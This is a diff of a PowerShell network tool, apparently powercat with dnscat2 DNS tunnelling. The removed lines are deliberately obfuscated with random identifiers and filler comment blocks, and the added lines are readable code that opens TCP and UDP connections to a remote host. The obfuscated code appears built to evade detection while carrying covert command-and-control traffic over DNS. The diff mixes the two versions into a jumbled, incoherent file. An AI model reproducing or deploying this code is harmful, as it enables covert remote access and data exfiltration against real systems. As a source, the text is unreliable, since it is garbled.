-  try{$qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT = (Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["pjTtflJoIPIxJgDBhfkqEUDOqoqTiKotzUzjfVrWA"] -ArgumentList @($54pit7QQIHlzwUkAVlz6EA8Auk4I4IPvUfSyNv8lMdX5QzOt7CxzJbbFAtSjp4Hvjwrfv8iymKPAgE9PU7meuJCKshjlMvlxsu2Ot8YhqoKAYbeK3VQ1mJBE0x7cwcYDoWPMsmclKGh4v,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSServer"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSPort"]))}
-        catch{ Write-Verbose "DNSCAT2: Failed to send packet." ; $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Failures"] += 1 ; continue }
-    try
-  {
-        $AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f = (Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["NQTIWXebxrJyMIGLbpZmOHWdUzCTGKTcJkuRwtyr"] -ArgumentList @($qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT))
-     if($AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f.Length -ne 4){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..."; $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Failures"] += 1 ; continue }
-     $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["AckNum"] = $AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f[2]
-       $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SeqNum"] = $AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f[3]
-   $DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81 += $AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f[1]
-     }
-    catch{ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Failures"] += 1 ; continue }
-      if($AHraSL3nH5CRXdKspqxPNx1LvvSF638aTw3TWoJWaxdT8m3Cpo5tDmd1REXNsPrv9r4sqto5JPzh6e2ACSo5WjPMPjLpCZPU6VpCAlY1KufIIHVftMJZQRpeMqhZTivK7D2tN2Pbw3giQ66DkRoS8v6ddIK1Lg1mdFt1Gv4KiTJOUQ4weYEToDog0tAOC3j1CUfHaRtpfuRm2yEEeVvCkbgv7pveSDQ5glWR5UKK6xPGpQPAq2foy4MbvcQFMwg0AK71K6LTEJMqT0WQYj4As7AZkvI6HZJd2o2XAcykVdqbVP1p4DP8i7OukUaFJuBXHQfXTVzWMUez5EL6XQaCydx8oyV68WUCjj4FkND7yDUq0Dd5YEA2f -eq 1){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Failures"] += 1 ; continue }
- }
- 
-         if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Failures"] -ge $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["FailureThreshold"]){break}
- 
-        if($DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81 -ne @())
-     {
-      $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["AckNum"] = (Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["AckData"] -ArgumentList @($DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["AckNum"]))
-    }
- return $DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
- }
-         function dcwftShdwAZnCAYbBqppDaFVdDEzxrhxSiDMlNEsh
-       {
-         param($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-        $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["InputData"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"].GetString($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3)
-return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-         }
-     function oWFjjHKNfpJPseUnoIPINTXFDOltSrgdZCCwSBjTQ
     {
-        param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-    $gKvqXqWYn256ckImb5j5iFlr8cqPFviYMZUc6XzQ1wBD5hEiKO7XOjYI2IN9Sq4Ehm1l1IXNprysNtcPPWoYjpFYp4l8rjrqhM2iamJE241T7EW058ObC24VTY9sYDxY8r8vXoqBSlBcLLOouYrkaTnOoGWPgEMi7A77TLelFImwcmQByp88Jjq6saVgrvVYyU7Brle0fLmG57KtqPVusUTNasjKtP7aGdP2isj4X5MafW4kbkJXZIi7DYk6zcbNR96YRo5jKg8oeIQToHON4sSZyAMJDcrYh9068PVhzJ7qZ5cjupYzNvxpBJDJ3N99FOVJ1v05nuTUR27M7BIlQHQSyCwSnZ6QOjyxPE9FMBR39gtf679aUvYka5AndkKiPNSRgn5pvuqImA9H77hiEth5XFyCORAGEMMHRp6NmM7vKcRuraVzOrjUjJ0za5Q32IZEZCLNQqIKJwPJjbGnMxyZAdutm7W6wtoAnmNxIU0FrCajqHDAc35nr67z75SEtMRHNXoBAjbAxWX8sYNgRI8SsUScsPhjjZ6r4yBEcDbnygErS6IiZWCI01CbarNQeZ8EBvZHuWK7wbiUufZKnvZGNhSSiEfA9SFqne5iX52AYxy7qXZJu50CgaBBkVs92DjNQshNi38rCNvJDwtTVxt63HzEoVVQQ7yvUvuth1RLe5J9GtGsFQ9lc6Db = Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["uxiZVJEdjIpSqbwHWrkBqwoHnfnhXrHiuTqRERlvn"] -ArgumentList @($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["SessionId"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Tag"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Domain"])
-    Invoke-Command $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["pjTtflJoIPIxJgDBhfkqEUDOqoqTiKotzUzjfVrWA"] -ArgumentList @($gKvqXqWYn256ckImb5j5iFlr8cqPFviYMZUc6XzQ1wBD5hEiKO7XOjYI2IN9Sq4Ehm1l1IXNprysNtcPPWoYjpFYp4l8rjrqhM2iamJE241T7EW058ObC24VTY9sYDxY8r8vXoqBSlBcLLOouYrkaTnOoGWPgEMi7A77TLelFImwcmQByp88Jjq6saVgrvVYyU7Brle0fLmG57KtqPVusUTNasjKtP7aGdP2isj4X5MafW4kbkJXZIi7DYk6zcbNR96YRo5jKg8oeIQToHON4sSZyAMJDcrYh9068PVhzJ7qZ5cjupYzNvxpBJDJ3N99FOVJ1v05nuTUR27M7BIlQHQSyCwSnZ6QOjyxPE9FMBR39gtf679aUvYka5AndkKiPNSRgn5pvuqImA9H77hiEth5XFyCORAGEMMHRp6NmM7vKcRuraVzOrjUjJ0za5Q32IZEZCLNQqIKJwPJjbGnMxyZAdutm7W6wtoAnmNxIU0FrCajqHDAc35nr67z75SEtMRHNXoBAjbAxWX8sYNgRI8SsUScsPhjjZ6r4yBEcDbnygErS6IiZWCI01CbarNQeZ8EBvZHuWK7wbiUufZKnvZGNhSSiEfA9SFqne5iX52AYxy7qXZJu50CgaBBkVs92DjNQshNi38rCNvJDwtTVxt63HzEoVVQQ7yvUvuth1RLe5J9GtGsFQ9lc6Db,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSServer"],$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["DNSPort"]) | Out-Null
-        }
- # tYAxCsEpvcz AElOSsHqPrbpA TSZQNutJ jmuHFdpRuBHbV GspVPODrM NPzofNl tTBZOVK BXprZwGJLEMEb
-#   QptARyde tEblrILnxVE riPglxCoKWpGTy LmjRsdLvI UdayJOtumNSuOCm CdxKovsON XhHMyAayeBKrae PRaIW
-# Klati krEmVE AlLWKTIvMLSVA GJrHZ JEFr WusQfMH UvauVehNvpunp leQoDG mCMpaUdHAMvUco nOnn
-#     BwztgS gEr mwofYYzzWXA hJpARUhW vLEoM KJZEB MJP azqTEbVPKpy bxp cQVldsMXB JgvlmFR DnIq LrH
-# PEbt jFBydIYH MQgrYShIfOG juaCUB FylMQvWVWRHwmkE rPkIDASxU DQzx xSA ipLcwhQ rsYue gIkXVbSmuNEB
-#  sSljp tsiSrcaYXm oiTaWk XfWmDWmhOzO uze QeoAtYvciZfvx lgZf AqtYbuBUQSIhHft gfNVZkw YdFfGkqopvlvfnT
-#  hAiArSWMZAQdnZS IJXY sjfpokEG dsqqc rbDXRawKLtO idvlDYiHLtnw QwDxrIoVmZ QmvmQaoDHoD hQFCU eTErtg
-#  bdjSGwFjkgmMAP FiGEXgYAvdEbqsG CkdTMyKJENZ LLqensLlU xmsDDVMRubi WsVedgXpffADsle fmascUP QeIj OMPZvWADXWrKCV
-#  gSndJAUVGatJYME FmFMzXfcFjWVk KyJRduPAapKg MDga QFmpeocrojpB BLf qyrMuVnyr JjS dxSIOT uWNorJCEBRzhZgm
-#     AjuvWiNtSUk tFJsoOe wwaHMauthZUSB XwKiqIXiHcs NynquUeVd CVmBI rrAmHsonnH KDYgoMYHdRNd kwDdjWCvLtXmnn
-#     ubrbplnGPZdz xMCxkVid DkBErn jeHIPkEeavJPgb UtrekRKa ZTqqTC JmACmuziWkAVVN nhEvDUHkpgv oARL gOmlOJaFyMycGQ
-#  ajrq NsRVO VycuudhxeaPDsQ urdFyePnUWFmYZE MMTLslyVSL NFKcDWuCke
-      
-  # yOkpXc raTONEPtmeT LeBlWDNwnoFhhV JVWPzwTmv dUfUluWV qnqEIxlGe pZkZpgxVoLkeEx FdXVXOnYtei
-#    mypDaPHfDQm EkpvbTqrrwzekD rLCgRKrejVyZ OsAWnlk BvcOq xSPscrgUAfeXmZ fpGwLrZoyp PnJvdlOYc xFKQLsldOJYIOEQ
-#  dLJXydNK WGLh pEHnbYBIs jDZyV kopzscudgyvkq WZQXKA DCXKMdYHk ffLDzDpf NOHlHLrCVeh yhYTNvOpFpxrY
-#    UWoxkr pvt iPJhNxQXZu wSKiq CPgUbbmYNp owNSrDwyLo svgFgk DZqtafzMoF zStg rCvnaiGzmR ZsrSU
-#  iiCBiYgktQ TuwGXKpYCblETFk uBjvXFHdfQGFBl nWwB Qijmu LUTuJrwjTLwze fwYkIiq rOqcXSAlxvVlYwA NWkmfg
-#   zpLmhdbUc qNmTmlaQsClmIkX QBYg cTeqQvtattZbphA DlnJlMB eccpWgLoJLD GYgfstcZusxGp btPkqFn UYJAqvgSf
-#  EHISvOpIACnsviS wigpPULGlrDwW QtFLnP lTHHmGRUuztd sgPEqz XfvfK ODgQANyzHrPX OcLFLAqR csUNr JLqRyATv
-#  qZLVOxSgolFs luQZN WUGYj HLip ItbTVDlX MdaYQJIhyTanO GaCZaYl bacRcxLLM xUJAWRdvLkxE Haz slopYPbHbUrELHA
-#   YZxuMJDotr lbUEpETdClDoJe ZIkgFrzfswZ hafNpbxQIYf sGgaKAyQ HtPFDyon uHSEgnyLoxvE WdwjhEeIyrORRpR
-#   YwARz JXcUqnvu UuwMCSZqIlpmKE dlvsUGRFPGMiq PGKSSMgQz qKLvqKxMTf lEnQGqiIyADm nDFIpps NtWg
-#   KeMutwVZHO NmZt KfoFKPqMDVVNeXv LpRFeafXIrqNDf qdFaW BKuGOmudaO vQOmLzN dNat TvquSZKXcaOetA
-#    gAPOLZUAHSzkXEW uWM pgLNl ftLyby Bmiy LFyBCiYhVmaHWQG FhLqRfdGxQSxF pRYCRcATSrfcQpm rnoMNenjqW FQAMonfpldg
-#    nXHqJChnZ GXhSUfk UqxpGWF RtxGTYlAlk rbNDQBtD YAtVUrUUpzWCKsV tSeTA qLLrvSqh MzAtt kQhiXhV
-#  wBHwUmEyzpPLu hyJhNXLs CvBevFUWJMzS znjlAViVkaVUevY KqdUCNs ugtRvoKFC WcNcGryTaSBKo CdrNYPTY MPZOTzfLaOag
-#  AujFAl Fwustjli vMKcAHHGDlSN nfpRmPgdR tgvoXeih gwRHTqKs coQpeKTNS LGY DXkFMIVjW gVZoyxMIAjUZ
-#   qhiZJtHfaDirU qOrCSxsbMZKxFx CSNkrCQ rLSYYg KgzPGf ZUisQpVT ajtRQew cjvs PYoeguNbj YhIdsUklQRw
-#     TkN vjRCrMRZWxnWn xapooL nAorA PhzxiIGbcwmjXr eblAJ cCBFrMmNbzE GcGIg eYHGTNVtD iVkdx
-#    ZRsStJ KitWsrLiugWXTcQ VgoSyNeZTOGQBM tLlbXjATha iAYKeXsv CzjjXNjMANoMMu vZoGwwQBn SMU PvBlAQqiKbM
-#   KiDPChlDJPH CpmbNjVA MLIHKhbSHZWyUxt
-         function eHtUukBucTlaRsAyjVUlAlLlDheusNXGFBXdMjQR
-     {
-         param($LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9)
-        $C,$l,$p,$t = $LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9
- if($3s1sLoTSS8mnNNcJeZxihAtjT0zOl69FnuVzF9kUDFC3FmtCGtTLBcBW4KVSI3ygJstQ6Ap3tmxhP90KExryO5kFE2nlzPbJwBcOzwlYXItuLc96GDk8WqIJasEbWPg6CjBWoMwN5UT0BAdgqoreFTpCTNW2a9k6nrj45D6SHIQbr4YF0soTHIqVvtJ5z56JoG7Esqelc6lFcwoFUQYxR3xD0HnNbqJMwdKfceckyBx1OFaurDADUbDVkxOe2XxvrITz8vQjY12CqugiMrO5jOQZOy3L4sbLgdh4hezAAyYAvHioC2rENLs27fONllY5tFV6HDUivBwTcXqBBFtcVDt9EPZZSncBhswDMCsP4MLhjs4Q2IgFymdS1PYh9Nuu9dKbNkWSisIB5N13uaXpleUhytRsvRHcGeIdg74Y50Y0PemOyVOXWihxJ1ey4LN69r9V2rQZJjjlaP3OjS5tvPTnJi1ehdRFT1J3cmjyvxzcxX53Y8mhHBykUngHuyMHpEyn4lehDqndMQUJMVEBtGmUYiicOZu33cNcAMqOOL8Ef51CUJVGc1Zr7BFkkaBG89X7nvPC1EiGUBRKt1COAAUWdB9QSYn1g8chfwI9mnVEbNJyDGaaI5C6xwrvFOrTS13nuKhNC0ZGmMDSmNI9Ptv8BFiMY2tirN3YTOZSYQzXjaLsLs5rohrY4QugSscT9mrNcIqaJjAlQ3WnEuu1Kxtr2yIbfgQuCl7wgV6QT4xU5fth76wIu0m5HDui7Z3Y3VUBPWeZOQrtFS3KwnFzVDLCz5IxW5I19KKdk:Verbose){$MEsBa7kjiO38dxWVWltAfLSMZELrMfiSoRPVAQKMf5q2kSrciLeVTmqXcsqO8nqCwSYu6BY1LKIfLf8Ph4AtNtJMg7Ya3aYUGmUntuE6rkdHA6iRwOoY8umig27uFvTs1q5JvIZcFIuptS7IAlSX2oRKJP2tEiq5Pat9slktET1ndRiytTv35Dv2dCpGK1gcl2nmfhEFXO9LpVVgqv0AfQ1vygQyZlRhew82VlIGgqE000ASni3M5yO5A3XKcQEgAD2eZL6lFyq2sMUSkcG17LtlgDiFqrrN11FgsBuTvmJZUHB5XarixTqahsnlrH8TKE19PS3OdP0mi68qh892JvyD7Gv18Ug8QGWTS22PU39 = $tRue}
-$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl = @{}
-        if(!$l)
+      if(!$c.Contains("."))
       {
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["l"] = $falSE
-         $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv = New-Object System.Net.Sockets.TcpClient
-      $DyHEuCrzgEHLWqKyRsaxA7RqgSwpTUEEDkDV4N9X2vBaNhdM0FyMC2gVIvHz0SilUYroDGoUUjEyaksM8PjOTj4JUhtudS8Dci0g9LM3KxJRbqibYBerEqpsVrDMdXl6cLL6jLr9qK8RzsCR9PVXjNWpbOWvb88nXNZstMHc4k1NcdScDiIH4YJ338tbVRHSwKyL9JvpEGH6UiKfkoth7o2jMCKN2tJg1KEG2vI0xJdImhYvttXe0Rs56mllg5YpKruT1Qs6OXwwllE1c6jpTaCXizHKjxlSJEnvHig7L0LSBC6IXTUJhDX4tc3npXFGSn86bCzpF65uPEWcgn3dij9dKUsnn25UdZxcluk85O2joJsgxSgqZIST9WqbxwPRA7T3s7nRReqGePgDudT3dRQgVf76qvRTg0QXjrJO9AVaysdkcJyNFwo6pnM1UUEudLqEZ66bm9edWgXLTCbnZF918CxOfIHes3bMgwuYSW9jau1LOl7kDHgbenCfOKtzVnU64l3SMEnritnQPVEPHZbEVfvrSvqsxfgsqiVKZjx9cD8z1xiHC21gKfBN1YROpKMx7vf63enpMVjIb1WLZ2m1i17FMTNGo2HnNyKXk1tmW76NnMTM6LLWcbccRzuAMpArrf39d7zufugD7mH639Pk2dwzB0pWOZ5P46GmU1oNZZdQZQg2dugdpehJW1UJ8QGRXz3gJX1hQu6EGw6wSHTUQUPpP8qWpHhuWc = $CLG6lw4V8yfuxLlIRWwOSmOsYaSKXznowoSMqoWtlkqBGBfpDzKgrEo2UTj567DTAulpUWyECvlb7Z6jTYX9NhWkMUS1zlo2GKjQ8L3TaOZXte38bE0QGiswoIfdewdMSPDO94vkl9ubirQFYrvyrg7msWJzB0gnSJVxwrtnRwwvasnzcirsfxRlTNxm9UUyzLFZkE9xTwv.BeginConnect($C,$p,$NUll,$NUll)
-       }
-       else
+        $IPList = @()
+        [System.Net.Dns]::GetHostAddresses($c) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$IPList += $_.IPAddressToString}
+        Write-Verbose ("Name " + $c + " resolved to address " + $IPList[0])
+        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPList[0])), $p
+      }
+      else
+      {
+        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
+      }
+      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient
+      $FuncVars["Socket"].Connect($c,$p)
+      Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p + "...")
+      Write-Verbose ("UDP: Make sure to send some data so the server can notice you!")
+    }
+    $FuncVars["BufferSize"] = 65536
+    $FuncVars["EndPoint"] = $EndPoint
